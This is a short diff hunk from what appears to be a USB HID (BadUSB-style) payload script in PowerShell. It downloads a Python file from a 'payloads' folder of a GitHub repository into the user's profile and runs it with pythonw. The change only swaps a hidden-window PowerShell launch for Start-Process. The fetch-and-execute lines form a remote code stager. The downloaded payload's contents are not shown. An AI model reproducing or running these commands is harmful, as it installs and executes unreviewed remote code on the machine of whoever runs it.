@@ -20,5 +20,5 @@ else {
 }
 
 curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
-powershell.exe -WindowStyle Hidden -Command (pyw (Join-Path $env:USERPROFILE 'gdi1.py'))
+Start-Process (pyw (Join-Path $env:USERPROFILE 'gdi1.py'))
 exit
